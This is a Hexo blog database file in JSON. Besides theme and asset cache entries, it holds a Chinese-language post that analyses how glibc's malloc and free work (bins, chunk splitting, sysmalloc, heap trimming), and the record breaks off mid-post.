{"meta":{"version":1,"warehouse":"2.2.0"},"models":{"Asset":[{"_id":"themes/apollo/source/favicon.png","path":"favicon.png","modified":0,"renderable":1},{"_id":"themes/apollo/source/css/apollo.css","path":"css/apollo.css","modified":0,"renderable":1},{"_id":"themes/apollo/source/font/sourcesanspro.woff","path":"font/sourcesanspro.woff","modified":0,"renderable":1},{"_id":"themes/apollo/source/font/sourcesanspro.woff2","path":"font/sourcesanspro.woff2","modified":0,"renderable":1},{"_id":"themes/apollo/source/scss/apollo.scss","path":"scss/apollo.scss","modified":0,"renderable":1},{"_id":"source/images/linux_heap_analysis0.png","path":"images/linux_heap_analysis0.png","modified":0,"renderable":0},{"_id":"source/images/ciscnctf_2016_careful_writeup0.png","path":"images/ciscnctf_2016_careful_writeup0.png","modified":1,"renderable":0},{"_id":"source/images/ciscnctf_2016_cis2_writeup1.png","path":"images/ciscnctf_2016_cis2_writeup1.png","modified":1,"renderable":0},{"_id":"source/images/ciscnctf_2016_cis2_writeup2.png","path":"images/ciscnctf_2016_cis2_writeup2.png","modified":1,"renderable":0},{"_id":"source/images/ciscnctf_2016_cis2_writeup0.png","path":"images/ciscnctf_2016_cis2_writeup0.png","modified":1,"renderable":0},{"_id":"source/images/ciscnctf_2016_cis2_writeup3.png","path":"images/ciscnctf_2016_cis2_writeup3.png","modified":1,"renderable":0}],"Cache":[{"_id":"themes/apollo/.gitignore","hash":"a006beea0877a0aa3610ee00e73f62cb1d45125b","modified":1477754720876},{"_id":"themes/apollo/LICENSE","hash":"6e31ac9076bfc8f09ae47977419eee4edfb63e5b","modified":1477754720876},{"_id":"themes/apollo/README.md","hash":"fb6fbe42172a35cbdaa540a777cc4bc02add2278","modified":1477754720876},{"_id":"themes/apollo/_config.yml","hash":"f21f18489dc00e0541d7041a81789a2ea8cccd3b","modified":1477793947488},{"_id":"themes/apollo/gulpfile.js","hash":"857a026b6643a2cd52c65d4ae0dc7fe9618206ee","modified":1477754720876},{"_id":"themes/apollo/package.json","hash":"4d13f5f859db7d008f49251543a8f610b2ecabd5","modified":1477754720876},{"_id":"source/_posts/linux_heap_analysis.md","hash":"43c42306a42accafdc955b9aebb3985f36b4b71a","modified":1478005739732},{"_id":"themes/apollo/.git/HEAD","hash":"acbaef275e46a7f14c1ef456fff2c8bbe8c84724","modified":1477754720872},{"_id":"themes/apollo/.git/config","hash":"4eba8e6ddc5a8da6c66aa99763c7831c5ddcee6f","modified":1477754720872},{"_id":"themes/apollo/.git/description","hash":"9635f1b7e12c045212819dd934d809ef07efa2f4","modified":1477754659400},{"_id":"themes/apollo/.git/index","hash":"5ce25a2103dc7260ebdfe591b59b53b92d128f59","modified":1477755588564},{"_id":"themes/apollo/.git/packed-refs","hash":"2ab66d2cb8ce41e703f19a82c8a86fe917b9f9e9","modified":1477754720872},{"_id":"themes/apollo/doc/doc-en.md","hash":"d6d9756b2085cdd8ee51eb5594427e2abf170e94","modified":1477754720876},{"_id":"themes/apollo/doc/doc-zh.md","hash":"d43c1f6bff66426744a2c6f031d19ff09cdeb2d1","modified":1477754720876},{"_id":"themes/apollo/languages/en.yml","hash":"40292f2a48e4e6361132033a47c516cb33127b6c","modified":1477754720876},{"_id":"themes/apollo/languages/zh-cn.yml","hash":"9e4b03e14c094000257ea254fd660dde4c7af63c","modified":1477754720876},{"_id":"themes/apollo/layout/archive.jade","hash":"62797414355bf4474092bc3a32726c8340820ffb","modified":1477754720876},{"_id":"themes/apollo/layout/index.jade","hash":"55f2f1b4b5364a0e09cb18e1112664c6415fb881","modified":1477754720876},{"_id":"themes/apollo/layout/post.jade","hash":"245c26244c075c3632d1545c3b228ee9d112f15d","modified":1477754720876},{"_id":"themes/apollo/source/favicon.png","hash":"a9cdcb22d1e74d5480323e19d1983de5a6873b8c","modified":1477754720876},{"_id":"themes/apollo/.git/hooks/applypatch-msg.sample","hash":"86b9655a9ebbde13ac8dd5795eb4d5b539edab0f","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/commit-msg.sample","hash":"ee1ed5aad98a435f2020b6de35c173b75d9affac","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/post-update.sample","hash":"b614c2f63da7dca9f1db2e7ade61ef30448fc96c","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/pre-applypatch.sample","hash":"42fa41564917b44183a50c4d94bb03e1768ddad8","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/pre-commit.sample","hash":"36aed8976dcc08b5076844f0ec645b18bc37758f","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/pre-push.sample","hash":"b4ad74c989616b7395dc6c9fce9871bb1e86dfb5","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/pre-rebase.sample","hash":"18be3eb275c1decd3614e139f5a311b75f1b0ab8","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/prepare-commit-msg.sample","hash":"2b6275eda365cad50d167fe3a387c9bc9fedd54f","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/update.sample","hash":"39355a075977d05708ef74e1b66d09a36e486df1","modified":1477754659400},{"_id":"themes/apollo/.git/info/exclude","hash":"c879df015d97615050afa7b9641e3352a1e701ac","modified":1477754659400},{"_id":"themes/apollo/.git/logs/HEAD","hash":"bdad5a040fb991d1b5395b7733ea4bb28127144e","modified":1477754720872},{"_id":"themes/apollo/layout/mixins/paginator.jade","hash":"f4ee2fb61a32e199b48cf93771749edc8a007391","modified":1477754720876},{"_id":"themes/apollo/layout/mixins/post.jade","hash":"cd9447e9b0ad22213e6a17d9a9b948f9f998f921","modified":1477754720876},{"_id":"themes/apollo/layout/partial/comment.jade","hash":"ff0a2c269c2434da2ac5529872f1d6184a71f96d","modified":1477754720876},{"_id":"themes/apollo/layout/partial/copyright.jade","hash":"217f8b17054e5079f2d30bb7e2e4e36c0f2161b7","modified":1477754720876},{"_id":"themes/apollo/layout/partial/head.jade","hash":"d062dafabfe65198e5cf2ddb0e47d909885aa950","modified":1477754720876},{"_id":"themes/apollo/layout/partial/layout.jade","hash":"eb15573ff66bdbb110ac77cf360b740170cee738","modified":1477754720876},{"_id":"themes/apollo/layout/partial/nav.jade","hash":"dfdd6c667e537a98cca852f713c2057f2012ff61","modified":1477754720876},{"_id":"themes/apollo/layout/partial/scripts.jade","hash":"cf3339de8979b5f75a3011f0f6b5451091b77dc8","modified":1477754720876},{"_id":"themes/apollo/source/css/apollo.css","hash":"805612fea3f0768dc705058f4b9b8bc95abe4ed4","modified":1477754720876},{"_id":"themes/apollo/source/font/sourcesanspro.woff","hash":"a6722c9b6439b7a020a9be3d3178970757a9265c","modified":1477754720876},{"_id":"themes/apollo/source/font/sourcesanspro.woff2","hash":"da65f527a8da65d5eb6721626d28cfdb46ab104a","modified":1477754720876},{"_id":"themes/apollo/source/scss/apollo.scss","hash":"153bbf882c1f6f65bb4510999b51812e20016ca7","modified":1477754720876},{"_id":"themes/apollo/.git/objects/pack/pack-6aaf31ec22cdef45ed9d330ad851b764de8b9225.idx","hash":"6cda2844ea32155bd203f51a5759425b009854cd","modified":1477754720852},{"_id":"themes/apollo/.git/refs/heads/master","hash":"4605c6681d054db5754369e5211848dd9dcacaef","modified":1477754720872},{"_id":"themes/apollo/source/scss/_partial/archive-post-list.scss","hash":"d2f740a7d48349b7536777c795f82ab740836d0f","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/base.scss","hash":"ae967b2049ecb9b8c4e139ecce32fd9fb5358ac5","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/copyright.scss","hash":"1309667e3000037170cfbb5b8c9c65f4ffcf6814","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/footer.scss","hash":"094aca6e52f11b139ac7980ca03fa7b9d8fc7b2f","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/header.scss","hash":"153bde88bf8ffeae4ffd813d8cc694dd83d33d94","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/home-post-list.scss","hash":"6b5c59f3d2295944f934aee2c1156012a3306d5d","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/mq.scss","hash":"b5eb0fb35fb275cbb6452b5d98702d461af3e6d5","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/normalize.scss","hash":"fd0b27bed6f103ea95b08f698ea663ff576dbcf1","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/post.scss","hash":"912776a0eb7ad5a387b9aa929c857b6edd0c113e","modified":1477754720876},{"_id":"themes/apollo/.git/logs/refs/heads/master","hash":"bdad5a040fb991d1b5395b7733ea4bb28127144e","modified":1477754720872},{"_id":"themes/apollo/.git/refs/remotes/origin/HEAD","hash":"d9427cda09aba1cdde5c69c2b13c905bddb0bc51","modified":1477754720872},{"_id":"themes/apollo/.git/logs/refs/remotes/origin/HEAD","hash":"bdad5a040fb991d1b5395b7733ea4bb28127144e","modified":1477754720872},{"_id":"themes/apollo/.git/objects/pack/pack-6aaf31ec22cdef45ed9d330ad851b764de8b9225.pack","hash":"0b0a61658bae0aea180f5c9fd2d12236e3ad0fe2","modified":1477754720852},{"_id":"source/images/linux_heap_analysis0.png","hash":"dd0ef5e08c098db02b994b0b2be6226c1f7cc1c2","modified":1477755312896},{"_id":"public/atom.xml","hash":"9a567e4b88a470a1c5953bc87101af94e456f85d","modified":1478008458328},{"_id":"public/sitemap.xml","hash":"f5d60259ce7da0605a98bdf49353a1c5b14a099c","modified":1478008458329},{"_id":"public/2016/10/29/linux_heap_analysis/index.html","hash":"663321960d4711c5dc7ba2a7dc472a5c54ad2db6","modified":1477793955349},{"_id":"public/archives/index.html","hash":"e72fca22a1d672657482cb9fb59db980ed8245f6","modified":1478008458337},{"_id":"public/index.html","hash":"b4f1864e6818d67f3b511057d0ca86a63537841d","modified":1478008458337},{"_id":"public/favicon.png","hash":"a9cdcb22d1e74d5480323e19d1983de5a6873b8c","modified":1478008458348},{"_id":"public/font/sourcesanspro.woff","hash":"a6722c9b6439b7a020a9be3d3178970757a9265c","modified":1478008458348},{"_id":"public/font/sourcesanspro.woff2","hash":"da65f527a8da65d5eb6721626d28cfdb46ab104a","modified":1478008458348},{"_id":"public/scss/apollo.scss","hash":"153bbf882c1f6f65bb4510999b51812e20016ca7","modified":1478008458348},{"_id":"public/css/apollo.css","hash":"805612fea3f0768dc705058f4b9b8bc95abe4ed4","modified":1478008458358},{"_id":"public/images/linux_heap_analysis0.png","hash":"dd0ef5e08c098db02b994b0b2be6226c1f7cc1c2","modified":1478008458368},{"_id":"source/_posts/alictf_2016_fb_writeup.md","hash":"42146065fa43b283ca88414ddc886fd110b77cb3","modified":1478007005356},{"_id":"public/2016/06/07/alictf_2016_fb_writeup/index.html","hash":"8323a663ffb4a60650abd0731e315e97ad08c9ad","modified":1478008458337},{"_id":"public/2016/05/29/linux_heap_analysis/index.html","hash":"f9b2704dce95ad2068aa0adf378c349cf61d5544","modified":1478008458337},{"_id":"source/_posts/ciscnctf_2016_careful&cis2_writeup.md","hash":"305cf63a35483772d06ecdd0ffe7fbf6d0122892","modified":1478005654760},{"_id":"source/images/ciscnctf_2016_careful&cis2_writeup0.png","hash":"c5a30f6744b4d9701fed1c29f244120c35d77d22","modified":1478004924292},{"_id":"source/images/ciscnctf_2016_careful&cis2_writeup2.png","hash":"30da61dea607e724eef6c561b5e26b4e62ddb528","modified":1478004924660},{"_id":"source/images/ciscnctf_2016_careful&cis2_writeup3.png","hash":"a5a82996a9fb8c3b837e0f23dad33ec9edf123cf","modified":1478004924784},{"_id":"source/images/ciscnctf_2016_careful&cis2_writeup1.png","hash":"922fb06d76dacd2ee6970e1717f20419e35c92a3","modified":1478004924496},{"_id":"source/images/ciscnctf_2016_careful&cis2_writeup4.png","hash":"d8a265c46c2ed2276c74f78f4532e260c7e56136","modified":1478004925724},{"_id":"public/2016/11/01/ciscnctf_2016_careful&cis2_writeup/index.html","hash":"75db1e579e0e503045cd93240d0a1f9d7fbefec6","modified":1478005254349},{"_id":"public/images/ciscnctf_2016_careful&cis2_writeup0.png","hash":"c5a30f6744b4d9701fed1c29f244120c35d77d22","modified":1478005785813},{"_id":"public/images/ciscnctf_2016_careful&cis2_writeup2.png","hash":"30da61dea607e724eef6c561b5e26b4e62ddb528","modified":1478005785813},{"_id":"public/images/ciscnctf_2016_careful&cis2_writeup3.png","hash":"a5a82996a9fb8c3b837e0f23dad33ec9edf123cf","modified":1478005785813},{"_id":"public/images/ciscnctf_2016_careful&cis2_writeup1.png","hash":"922fb06d76dacd2ee6970e1717f20419e35c92a3","modified":1478005785815},{"_id":"public/images/ciscnctf_2016_careful&cis2_writeup4.png","hash":"d8a265c46c2ed2276c74f78f4532e260c7e56136","modified":1478005785826},{"_id":"public/2016/07/11/ciscnctf_2016_careful&cis2_writeup/index.html","hash":"3a4e8dc008a2bfcca740c69cac608626a9bd18f3","modified":1478005785801},{"_id":"source/_posts/ciscnctf_2016_careful_writeup.md","hash":"f9a83816314ff4075a470d7f69d6841c6bc88529","modified":1478007038884},{"_id":"source/_posts/ciscnctf_2016_cis2_writeup.md","hash":"fb9c921ca226398e6f1ce3b4ed4b72df9b54a59d","modified":1478007059088},{"_id":"source/images/ciscnctf_2016_careful_writeup0.png","hash":"c5a30f6744b4d9701fed1c29f244120c35d77d22","modified":1478004924292},{"_id":"source/images/ciscnctf_2016_cis2_writeup1.png","hash":"30da61dea607e724eef6c561b5e26b4e62ddb528","modified":1478004924660},{"_id":"source/images/ciscnctf_2016_cis2_writeup2.png","hash":"a5a82996a9fb8c3b837e0f23dad33ec9edf123cf","modified":1478004924784},{"_id":"source/images/ciscnctf_2016_cis2_writeup0.png","hash":"922fb06d76dacd2ee6970e1717f20419e35c92a3","modified":1478004924496},{"_id":"source/images/ciscnctf_2016_cis2_writeup3.png","hash":"d8a265c46c2ed2276c74f78f4532e260c7e56136","modified":1478004925724},{"_id":"public/2016/07/11/ciscnctf_2016_cis2_writeup/index.html","hash":"922f9b1c2169c52f3414226191a1e489a06c707b","modified":1478008458336},{"_id":"public/2016/07/11/ciscnctf_2016_careful_writeup/index.html","hash":"0350bf25c21fa64b6f30833b626586f310a0f50a","modified":1478008458337},{"_id":"public/images/ciscnctf_2016_careful_writeup0.png","hash":"c5a30f6744b4d9701fed1c29f244120c35d77d22","modified":1478008458349},{"_id":"public/images/ciscnctf_2016_cis2_writeup1.png","hash":"30da61dea607e724eef6c561b5e26b4e62ddb528","modified":1478008458349},{"_id":"public/images/ciscnctf_2016_cis2_writeup2.png","hash":"a5a82996a9fb8c3b837e0f23dad33ec9edf123cf","modified":1478008458349},{"_id":"public/images/ciscnctf_2016_cis2_writeup0.png","hash":"922fb06d76dacd2ee6970e1717f20419e35c92a3","modified":1478008458356},{"_id":"public/images/ciscnctf_2016_cis2_writeup3.png","hash":"d8a265c46c2ed2276c74f78f4532e260c7e56136","modified":1478008458363}],"Category":[],"Data":[],"Page":[],"Post":[{"title":"Linux下Glibc 堆的malloc及free过程分析","date":"2016-05-29T13:03:00.000Z","_content":"\n想要搞明白Linux下的堆管理方便学习下Linux下的堆的攻击利用方式，但看了[这篇分析][1]之后感觉在过程上还是不够清晰，于是自己找来Glibc 2.23.90的源码分析了一遍，做了流程上的整理放在这里。链接中已经详细剖析过的结构体等等就不再赘述，主要整理下分配及释放的过程。\n\n<!--more-->\n\n## 分配 \n（fastbin的分配发生在链表的头部，其余都发生在链表尾部）\n（在fast链表中是精确分配（只有大小完全符合才会分配）\n    unsorted链表除非是remainder chunk时非精确分配，其余都是精确分配\n    small链表在第一遍时是精确分配，第二遍时非精确\n    large链表一直都是非精确分配）（注意链表和chunk不一样）\n（为毛top chunk必须置位prev_inuse位？翻找了一下说是规定。。。）\n\n1、首先获取Arena的锁，保证安全\n2、进行chunk的size检查等（包括将请求size转换为chunk的size，将传入malloc的size加上8 bytes的overhead并向16 bytes对齐（32位下是8 bytes），32位下最小为16bytes，64位下最小为32bytes）\n——一种情况是没有可用Arena\n没有可用Arena会直接交由sysmalloc处理，进入后直接尝试mmap分配，失败返回0\n——另一种情况是有可用Arena\n1、如果请求属于Fast bin大小，就从Fast bin中分配，失败则进行normal bin的分配过程（分配成功后有fastbin的index的反向计算的安全检查再返回）（中间运用了原子操作来优化从链表中删除chunk）\n2、然后再判断是否属于small bin，是的话找到对应bin链表的最后一个chunk进行分配（期间也有安全性检查，到small bin时才会有arena的初始化检查），否则计算再large bin中的index再清fastbin，进入下一步（在这一步时确定了index）\n3、开始遍历unsorted bin，如果属于small bin且Last Remainder chunk是unsorted bin 中的唯一一个chunk并且能够满足大小，那么切割这一chunk进行分配，并把剩余部分继续成为remainder chunk放入unsorted bin，如果大小能够精确匹配目标（不管是small还是large），就分配这一chunk返回，否则放入相应的small 链表或large 链表（维持large 链表从大到小的顺序），遍历unsorted bin不会超过MAX_ITERS，超过的话即使unsorted 链表中还有可能可以分配的chunk也直接到下一步\n4、如果是large bin，根据算出的index找到对应链表，如果链表为空或者链表中的最大chunk也不能满足，进入下一步，否则就开始倒序查找（使用nextsize指针，该指针指向下一个不同大小的正序中的第一个的chunk），找到后分割返回（如果分割后剩余大小不够MINSIZE就不分割），把分割后的chunk放入unsorted bin头部（如果该chunk为large 设置该chunk的两个nextsize指针为NULL）\n5、使用binmap从之前确立的bins中的index链表开始，使用binmap加快搜索，找到最适合的可分配的链表（使用位运算，如果没有直接跳到下一步），然后拿出链表最后一个chunk（大小肯定是够的），然后分割分配（如果分割之后的大小小于MINSIZE就不尽兴分割），然后剩下的成为remainder chunk放入unsorted bin头部（和之前一样），然后返回\n6、开始使用top chunk分配，先看top能不能满足，如果能满足切割分配，剩下的继续成为top chunk，否则看是否还有fastbin，如果有进行清fastbin操作再重新计算index，跳转到3继续循环（源码注释中说这样的循环最多这么一次，因为本来唯一可能循环的路径（存在fastbin）下一次不可能再满足），否则进行sysmalloc然后返回\n\n#### 关于sysmalloc \n1、只要要分配的chunk大小超过阈值且已经mmap的内存数量没超过阈值，就会进行mmap分配（或者没有获取到arena也会mmap，mmap分配失败就会直接返回0）\n2、然后看是否是main_arena，不是的话试图grow当前heap，失败则mmap一个新的heap，开辟新的heap后将old top chunk末端设置两个fencepost（就是一个极小的被标记为以使用的chunk，应该比MINSIZE还小，应该是8字节，在当前heap的最末端，如果top chunk大小不够MINSIZE，就全部设置为fencepost），然后free掉被删掉fencepost的top chunk（应该是放入到unsorted中），如果尝试new_heap也失败了还没有试过mmap分配，去尝试mmap分配\n如果是main_arena，调整所需的size进行brk分配，失败则尝试mmap分配，然后根据结果进行调整（处理一下分配失败、brk不增反减的情况，处理contiguous标志等等）\n最后再从top chunk中分配\n\n#### 按fast bin、small bin、large bin分 \n1、fast bin就是看一下fast链表，有正好合适的就分，否则和small 一样\n2、small bin先看small bins中有没有，然后遍历unsorted bin寻找（通过精确或者remainder，unsorted chunk 会被放回相应的small bin或large bin），然后使用binmap进行尽量合适分配（任何一次分割剩下的会成为remainder chunk，除了top），再不然就top或找系统\n3、large bin直接找unsorted bin，不行就往后找（使用binmap），否则top或系统\n\n#### 关于巨块的分配 \n没有看到源代码中有对于巨块的直接交给mmap处理的代码，应该是跟着整个流程走一遍然后能分配就分配否则mmap\nmmap分配的未必就一定是大的chunk\n\n## 释放 \n（所有chunk的释放都是插入链表头部）\n然后做一些基本的检查，比如size大小等\n1、如果是fast bin直接返回给fast bin，在fast bin中不会发生合并（chunk一直被标记为占用）\n2、然后如果不是mmap的内存（属于normal bin），看看前后能不能合并，能合并就合并后加入到unsorted bin链表头\n合并之后看合并之后的chunk的size，如果大于FASTBIN_CONSOLIDATION_THRESHOLD，会清fastbin，能合并的合并，然后全部放到unsorted bin链表中，然后试图收缩heap\n（其中如果回收的块是和top chunk相邻的，就直接合并到top chunk中去（如果TRIM_FASTBINS为1（我看到的源码里默认为0），fastbin也会进行合并，否则不合并），并且这些操作中间或有获取锁的操作保证安全）\n3、直接munmap返回给操作系统\n\n#### 来自源码中的注释 \nchunk不会被放回到normal bin中直到它们获得一次被malloc的机会\nChunks are not placed into regular bins until after they have been given one chance to be used in malloc\n\n#### 关于获取Size \n获取fd的size是将当前指针＋当前size后－4，获取bk的size是直接用当前chunk中的prev_size（如果前一个chunk正在使用的话似乎也不用获取他的size）\n\n## 关于堆的收缩 \n如果top chunk的大小过大（应该是超过一个heap segment，但是参考中的中文资料说子线程中的Top chunk一旦达到一个Heap Segment大小就会在这次free操作时归还给操作系统，但是如果整好处于边缘值岂不会造成mmap－munmap－mmap－munmap的浪费操作？）会将这块内存还给系统，但是会至少留下一部分内存继续作为top chunk\n\n#### 来自源码中的注释 \n收缩过程使用madvise的MADV_DONTNEED标志，表明这块内存不会再被访问，这是向内存管理器发出的建议，内存管理器会采取适当处理\n\n\n\n最后附一张图：\n![linux_heap_analysis0.png][2]\n\n\n[1]: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/\n[2]: /images/linux_heap_analysis0.png\n","source":"_posts/linux_heap_analysis.md","raw":"title: Linux下Glibc 堆的malloc及free过程分析\n\ndate: 2016/05/29 21:03:00\n\n---\n\n想要搞明白Linux下的堆管理方便学习下Linux下的堆的攻击利用方式，但看了[这篇分析][1]之后感觉在过程上还是不够清晰，于是自己找来Glibc 2.23.90的源码分析了一遍，做了流程上的整理放在这里。链接中已经详细剖析过的结构体等等就不再赘述，主要整理下分配及释放的过程。\n\n<!--more-->\n\n## 分配 \n（fastbin的分配发生在链表的头部，其余都发生在链表尾部）\n（在fast链表中是精确分配（只有大小完全符合才会分配）\n    unsorted链表除非是remainder chunk时非精确分配，其余都是精确分配\n    small链表在第一遍时是精确分配，第二遍时非精确\n    large链表一直都是非精确分配）（注意链表和chunk不一样）\n（为毛top chunk必须置位prev_inuse位？翻找了一下说是规定。。。）\n\n1、首先获取Arena的锁，保证安全\n2、进行chunk的size检查等（包括将请求size转换为chunk的size，将传入malloc的size加上8 bytes的overhead并向16 bytes对齐（32位下是8 bytes），32位下最小为16bytes，64位下最小为32bytes）\n——一种情况是没有可用Arena\n没有可用Arena会直接交由sysmalloc处理，进入后直接尝试mmap分配，失败返回0\n——另一种情况是有可用Arena\n1、如果请求属于Fast bin大小，就从Fast bin中分配，失败则进行normal bin的分配过程（分配成功后有fastbin的index的反向计算的安全检查再返回）（中间运用了原子操作来优化从链表中删除chunk）\n2、然后再判断是否属于small bin，是的话找到对应bin链表的最后一个chunk进行分配（期间也有安全性检查，到small bin时才会有arena的初始化检查），否则计算再large bin中的index再清fastbin，进入下一步（在这一步时确定了index）\n3、开始遍历unsorted bin，如果属于small bin且Last Remainder chunk是unsorted bin 中的唯一一个chunk并且能够满足大小，那么切割这一chunk进行分配，并把剩余部分继续成为remainder chunk放入unsorted bin，如果大小能够精确匹配目标（不管是small还是large），就分配这一chunk返回，否则放入相应的small 链表或large 链表（维持large 链表从大到小的顺序），遍历unsorted bin不会超过MAX_ITERS，超过的话即使unsorted 链表中还有可能可以分配的chunk也直接到下一步\n4、如果是large bin，根据算出的index找到对应链表，如果链表为空或者链表中的最大chunk也不能满足，进入下一步，否则就开始倒序查找（使用nextsize指针，该指针指向下一个不同大小的正序中的第一个的chunk），找到后分割返回（如果分割后剩余大小不够MINSIZE就不分割），把分割后的chunk放入unsorted bin头部（如果该chunk为large 设置该chunk的两个nextsize指针为NULL）\n5、使用binmap从之前确立的bins中的index链表开始，使用binmap加快搜索，找到最适合的可分配的链表（使用位运算，如果没有直接跳到下一步），然后拿出链表最后一个chunk（大小肯定是够的），然后分割分配（如果分割之后的大小小于MINSIZE就不尽兴分割），然后剩下的成为remainder chunk放入unsorted bin头部（和之前一样），然后返回\n6、开始使用top chunk分配，先看top能不能满足，如果能满足切割分配，剩下的继续成为top chunk，否则看是否还有fastbin，如果有进行清fastbin操作再重新计算index，跳转到3继续循环（源码注释中说这样的循环最多这么一次，因为本来唯一可能循环的路径（存在fastbin）下一次不可能再满足），否则进行sysmalloc然后返回\n\n#### 关于sysmalloc \n1、只要要分配的chunk大小超过阈值且已经mmap的内存数量没超过阈值，就会进行mmap分配（或者没有获取到arena也会mmap，mmap分配失败就会直接返回0）\n2、然后看是否是main_arena，不是的话试图grow当前heap，失败则mmap一个新的heap，开辟新的heap后将old top chunk末端设置两个fencepost（就是一个极小的被标记为以使用的chunk，应该比MINSIZE还小，应该是8字节，在当前heap的最末端，如果top chunk大小不够MINSIZE，就全部设置为fencepost），然后free掉被删掉fencepost的top chunk（应该是放入到unsorted中），如果尝试new_heap也失败了还没有试过mmap分配，去尝试mmap分配\n如果是main_arena，调整所需的size进行brk分配，失败则尝试mmap分配，然后根据结果进行调整（处理一下分配失败、brk不增反减的情况，处理contiguous标志等等）\n最后再从top chunk中分配\n\n#### 按fast bin、small bin、large bin分 \n1、fast bin就是看一下fast链表，有正好合适的就分，否则和small 一样\n2、small bin先看small bins中有没有，然后遍历unsorted bin寻找（通过精确或者remainder，unsorted chunk 会被放回相应的small bin或large bin），然后使用binmap进行尽量合适分配（任何一次分割剩下的会成为remainder chunk，除了top），再不然就top或找系统\n3、large bin直接找unsorted bin，不行就往后找（使用binmap），否则top或系统\n\n#### 关于巨块的分配 \n没有看到源代码中有对于巨块的直接交给mmap处理的代码，应该是跟着整个流程走一遍然后能分配就分配否则mmap\nmmap分配的未必就一定是大的chunk\n\n## 释放 \n（所有chunk的释放都是插入链表头部）\n然后做一些基本的检查，比如size大小等\n1、如果是fast bin直接返回给fast bin，在fast bin中不会发生合并（chunk一直被标记为占用）\n2、然后如果不是mmap的内存（属于normal bin），看看前后能不能合并，能合并就合并后加入到unsorted bin链表头\n合并之后看合并之后的chunk的size，如果大于FASTBIN_CONSOLIDATION_THRESHOLD，会清fastbin，能合并的合并，然后全部放到unsorted bin链表中，然后试图收缩heap\n（其中如果回收的块是和top chunk相邻的，就直接合并到top chunk中去（如果TRIM_FASTBINS为1（我看到的源码里默认为0），fastbin也会进行合并，否则不合并），并且这些操作中间或有获取锁的操作保证安全）\n3、直接munmap返回给操作系统\n\n#### 来自源码中的注释 \nchunk不会被放回到normal bin中直到它们获得一次被malloc的机会\nChunks are not placed into regular bins until after they have been given one chance to be used in malloc\n\n#### 关于获取Size \n获取fd的size是将当前指针＋当前size后－4，获取bk的size是直接用当前chunk中的prev_size（如果前一个chunk正在使用的话似乎也不用获取他的size）\n\n## 关于堆的收缩 \n如果top chunk的大小过大（应该是超过一个heap segment，但是参考中的中文资料说子线程中的Top chunk一旦达到一个Heap Segment大小就会在这次free操作时归还给操作系统，但是如果整好处于边缘值岂不会造成mmap－munmap－mmap－munmap的浪费操作？）会将这块内存还给系统，但是会至少留下一部分内存继续作为top chunk\n\n#### 来自源码中的注释 \n收缩过程使用madvise的MADV_DONTNEED标志，表明这块内存不会再被访问，这是向内存管理器发出的建议，内存管理器会采取适当处理\n\n\n\n最后附一张图：\n![linux_heap_analysis0.png][2]\n\n\n[1]: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/\n[2]: /images/linux_heap_analysis0.png\n","slug":"linux_heap_analysis","published":1,"updated":"2016-11-01T13:08:59.732Z","_id":"ciuw0d5ig0000pw60n24o3wgz","comments":1,"layout":"post","photos":[],"link":"","content":"<p>想要搞明白Linux下的堆管理方便学习下Linux下的堆的攻击利用方式，但看了<a href=\"https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/\" target=\"_blank\" rel=\"external\">这篇分析</a>之后感觉在过程上还是不够清晰，于是自己找来Glibc 2.23.90的源码分析了一遍，做了流程上的整理放在这里。链接中已经详细剖析过的结构体等等就不再赘述，主要整理下分配及释放的过程。</p>\n<a id=\"more\"></a>\n<h2 id=\"分配\"><a href=\"#分配\" class=\"headerlink\" title=\"分配\"></a>分配</h2><p>（fastbin的分配发生在链表的头部，其余都发生在链表尾部）<br>（在fast链表中是精确分配（只有大小完全符合才会分配）<br>    unsorted链表除非是remainder chunk时非精确分配，其余都是精确分配<br>    small链表在第一遍时是精确分配，第二遍时非精确<br>    large链表一直都是非精确分配）（注意链表和chunk不一样）<br>（为毛top chunk必须置位prev_inuse位？翻找了一下说是规定。。。）</p>\n<p>1、首先获取Arena的锁，保证安全<br>2、进行chunk的size检查等（包括将请求size转换为chunk的size，将传入malloc的size加上8 bytes的overhead并向16 bytes对齐（32位下是8 bytes），32位下最小为16bytes，64位下最小为32bytes）<br>——一种情况是没有可用Arena<br>没有可用Arena会直接交由sysmalloc处理，进入后直接尝试mmap分配，失败返回0<br>——另一种情况是有可用Arena<br>1、如果请求属于Fast bin大小，就从Fast bin中分配，失败则进行normal bin的分配过程（分配成功后有fastbin的index的反向计算的安全检查再返回）（中间运用了原子操作来优化从链表中删除chunk）<br>2、然后再判断是否属于small bin，是的话找到对应bin链表的最后一个chunk进行分配（期间也有安全性检查，到small bin时才会有arena的初始化检查），否则计算再large bin中的index再清fastbin，进入下一步（在这一步时确定了index）<br>3、开始遍历unsorted bin，如果属于small bin且Last Remainder chunk是unsorted bin 中的唯一一个chunk并且能够满足大小，那么切割这一chunk进行分配，并把剩余部分继续成为remainder chunk放入unsorted bin，如果大小能够精确匹配目标（不管是small还是large），就分配这一chunk返回，否则放入相应的small 链表或large 链表（维持large 链表从大到小的顺序），遍历unsorted bin不会超过MAX_ITERS，超过的话即使unsorted 链表中还有可能可以分配的chunk也直接到下一步<br>4、如果是large bin，根据算出的index找到对应链表，如果链表为空或者链表中的最大chunk也不能满足，进入下一步，否则就开始倒序查找（使用nextsize指针，该指针指向下一个不同大小的正序中的第一个的chunk），找到后分割返回（如果分割后剩余大小不够MINSIZE就不分割），把分割后的chunk放入unsorted bin头部（如果该chunk为large 